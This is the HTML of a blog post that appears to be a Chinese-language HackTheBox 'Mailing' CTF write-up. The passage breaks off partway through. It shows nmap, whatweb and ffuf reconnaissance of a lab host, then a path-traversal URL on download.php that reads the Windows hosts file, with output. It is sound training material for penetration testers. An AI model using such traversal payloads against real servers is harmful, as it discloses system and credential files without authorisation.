@@ -1,0 +1,1277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="kazma, blog, ctf, reverse, engineering, pwn, binary, ncku, life, programming, coding, cybersecurity">
+    
+    <meta name="author" content="kazma">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://kazma.tw/2024/08/15/hackthebox-machines-mailing-writeup/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="第一次打 HackTheBox 的 Windows 靶機～～～ Exploitation先 nmap： 1234567891011121314151617181920└──╼ [★]$ nmap -sV 10.129.241.62Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-08-15 07:36 CDTNmap scan report fo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox-Machines Mailing Writeup">
+<meta property="og:url" content="https://kazma.tw/2024/08/15/HackTheBox-Machines-Mailing-Writeup/index.html">
+<meta property="og:site_name" content="kazma&#39;s blog">
+<meta property="og:description" content="第一次打 HackTheBox 的 Windows 靶機～～～ Exploitation先 nmap： 1234567891011121314151617181920└──╼ [★]$ nmap -sV 10.129.241.62Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-08-15 07:36 CDTNmap scan report fo">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://kazma.tw/images/mailing_download.png">
+<meta property="og:image" content="https://kazma.tw/images/mailing_default.png">
+<meta property="og:image" content="https://kazma.tw/images/mailing_fail.png">
+<meta property="og:image" content="https://kazma.tw/images/maling_pop3.png">
+<meta property="og:image" content="https://kazma.tw/images/mailing_evil.png">
+<meta property="og:image" content="https://kazma.tw/images/mailing_pwn.png">
+<meta property="article:published_time" content="2024-08-15T12:32:40.367Z">
+<meta property="article:modified_time" content="2024-08-17T07:45:17.016Z">
+<meta property="article:author" content="kazma">
+<meta property="article:tag" content="htb">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="machines">
+<meta property="article:tag" content="pt">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kazma.tw/images/mailing_download.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/kazma.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/kazma.png">
+    <meta name="theme-color" content="#94878e">
+    <link rel="shortcut icon" href="/images/kazma.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            HackTheBox-Machines Mailing Writeup -
+        
+        kazma&#39;s blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"kazma.tw","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":["成大資安社 創辦人/社長"]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推薦閱讀","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#94878e","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/smoke.png"},"title":"kazma.tw","subtitle":{"text":["Pwning my life: ","Tales of coding, cybersecurity, and campus life"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#FFFFFF"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/kazmatw","instagram":"https://www.instagram.com/kazma.tw/","zhihu":null,"twitter":null,"email":"kazmatw@gmail.com","telegram":"https://t.me/kazma_tw","discord":"https://discord.com/users/870280109360316457"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":"enable"},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.4","navbar":{"auto_hide":false,"color":{"left":"#5d5764","right":"#94878e","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"ls":{"path":"/archives","icon":"fa-regular fa-archive"},"tags":{"icon":"fa-solid fa-tags","path":"/tags"},"whoami":{"path":"/whoami","icon":"fa-regular fa-user"},"cv":{"path":"/cv","icon":"fa-regular fa-file"},"ctfd":{"path":"https://class.nckuctf.org/","icon":"fa-brands fa-font-awesome"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"right","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"}}},"article_date_format":"auto","categories":{"enable":false,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/10/25 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+        
+<link rel="stylesheet" href="/fontawesome/sharp-solid.min.css">
+
+    
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="kazma's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+    <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        kazma&#39;s blog
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [40,0],
+                translateZ: 0,
+                opacity: [0,1],
+                filter: ['blur(5px)', 'blur(0px)'], // Starting from blurred to unblurred
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i,
+            }).add({
+                targets: '.ml13 .letter',
+                translateY: [0,-40],
+                opacity: [1,0],
+                filter: ['blur(0px)', 'blur(5px)'], // Ending from unblurred to blurred
+                easing: "easeInExpo",
+                duration: 1200,
+                delay: (el, i) => 100 + 30 * i,
+                complete: function() {
+                    hidePreloader(); // Call hidePreloader after the animation completes
+                }
+            });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/kazma.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                kazma&#39;s blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    LS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags"
+                                        >
+                                    <i class="fa-solid fa-tags fa-fw"></i>
+                                    TAGS
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/whoami"
+                                        >
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    WHOAMI
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/cv"
+                                        >
+                                    <i class="fa-regular fa-file fa-fw"></i>
+                                    CV
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   target="_blank" rel="noopener" href="https://class.nckuctf.org/"
+                                        >
+                                    <i class="fa-brands fa-font-awesome fa-fw"></i>
+                                    CTFD
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                LS
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags"
+                        >
+                            <span>
+                                TAGS
+                            </span>
+                            
+                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/whoami"
+                        >
+                            <span>
+                                WHOAMI
+                            </span>
+                            
+                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/cv"
+                        >
+                            <span>
+                                CV
+                            </span>
+                            
+                                <i class="fa-regular fa-file fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           target="_blank" rel="noopener" href="https://class.nckuctf.org/"
+                        >
+                            <span>
+                                CTFD
+                            </span>
+                            
+                                <i class="fa-brands fa-font-awesome fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/archives"
+                        >
+                            <span>Archives</span>
+                            <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/tags"
+                        >
+                            <span>Tags</span>
+                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">33</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">54</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">HackTheBox-Machines Mailing Writeup</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/kazma.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">kazma</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">成大資安社 創辦人/社長</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-08-15 20:32:40</span>
+        <span class="mobile">2024-08-15 20:32:40</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-08-17 15:45:17</span>
+            <span class="mobile">2024-08-17 15:45:17</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/htb/">htb</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/writeup/">writeup</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/machines/">machines</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/pt/">pt</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <p>第一次打 HackTheBox 的 Windows 靶機～～～</p>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>先 <code>nmap</code>：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ nmap -sV 10.129.241.62</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-15 07:36 CDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.241.62</span><br><span class="line">Host is up (0.086s latency).</span><br><span class="line">Not shown: 990 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE       VERSION</span><br><span class="line">25/tcp  open  smtp          hMailServer smtpd</span><br><span class="line">80/tcp  open  http          Microsoft IIS httpd 10.0</span><br><span class="line">110/tcp open  pop3          hMailServer pop3d</span><br><span class="line">135/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">143/tcp open  imap          hMailServer imapd</span><br><span class="line">445/tcp open  microsoft-ds?</span><br><span class="line">465/tcp open  ssl/smtp      hMailServer smtpd</span><br><span class="line">587/tcp open  smtp          hMailServer smtpd</span><br><span class="line">993/tcp open  ssl/imap      hMailServer imapd</span><br><span class="line">Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 33.73 seconds</span><br></pre></td></tr></table></figure></div>
+<p>酷欸好多東西開著。<br><code>whatweb</code> 看一下 hostname：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ whatweb 10.129.241.62</span><br><span class="line">http://10.129.241.62 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.129.241.62], Microsoft-IIS[10.0], RedirectLocation[http://mailing.htb], Title[Documento movido], X-Powered-By[ASP.NET]</span><br><span class="line">ERROR Opening: http://mailing.htb - no address <span class="keyword">for</span> mailing.htb</span><br></pre></td></tr></table></figure></div>
+<p>加到 &#x2F;etc&#x2F;hosts：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ <span class="built_in">echo</span> <span class="string">&quot;10.129.241.62 mailing.htb&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/hosts</span><br><span class="line">10.129.241.62 mailing.htb</span><br></pre></td></tr></table></figure></div>
+<p><code>ffuf</code> 掃一下路徑：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ ffuf -u http://mailing.htb/FUZZ -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt </span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://mailing.htb/FUZZ</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">assets                  [Status: 301, Size: 160, Words: 9, Lines: 2, Duration: 120ms]</span></span><br><span class="line"><span class="string">:: Progress: [100000/100000] :: Job [1/1] :: 511 req/sec :: Duration: [0:04:47] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure></div>
+<p>看到一個 assets，status 301，先有個印象就好<br>網站東西蠻多的還有一個 <a class="link"   target="_blank" rel="noopener" href="https://www.hmailserver.com/" >https://www.hmailserver.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 裡面蠻多功能的，但在首頁底下有個下載功能，滑鼠 hover 在按鈕上會看到：<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/mailing_download.png"
+                      alt="hover"
+                ><br>我們可以嘗試撈其他東西，例如 <code>http://mailing.htb/download.php?file=../../../../../../../Windows/System32/Drivers/etc/hosts</code> 可以撈到 &#x2F;etc&#x2F;hosts：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">└──╼ [★]$ <span class="built_in">cat</span> hosts </span><br><span class="line"><span class="comment"># Copyright (c) 1993-2009 Microsoft Corp.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This is a sample HOSTS file used by Microsoft TCP/IP for Windows.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This file contains the mappings of IP addresses to host names. Each</span></span><br><span class="line"><span class="comment"># entry should be kept on an individual line. The IP address should</span></span><br><span class="line"><span class="comment"># be placed in the first column followed by the corresponding host name.</span></span><br><span class="line"><span class="comment"># The IP address and the host name should be separated by at least one</span></span><br><span class="line"><span class="comment"># space.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Additionally, comments (such as these) may be inserted on individual</span></span><br><span class="line"><span class="comment"># lines or following the machine name denoted by a &#x27;#&#x27; symbol.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># For example:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#      102.54.94.97     rhino.acme.com          # source server</span></span><br><span class="line"><span class="comment">#       38.25.63.10     x.acme.com              # x client host</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># localhost name resolution is handled within DNS itself.</span></span><br><span class="line"><span class="comment">#	127.0.0.1       localhost</span></span><br><span class="line"><span class="comment">#	::1            